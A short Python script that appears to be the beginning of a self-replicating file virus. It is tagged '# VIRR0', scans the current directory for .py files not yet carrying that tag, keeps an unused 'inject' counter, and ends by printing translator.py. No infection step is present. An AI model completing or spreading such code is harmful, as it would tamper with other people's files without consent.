# VIRR0
import os
import glob

cwd = os.getcwd()
pyfiles = glob.glob(f"{cwd}/*py")
healthy = []
inject = 0

for path in pyfiles:
    with open(path, 'r') as f:
        lines = f.readlines()
        if lines:
            if lines[0] != "# VIRR0\n":
                healthy.append(path)
        else:
            healthy.append(path)

with open("translator.py", 'r') as f:
    print(f.read())
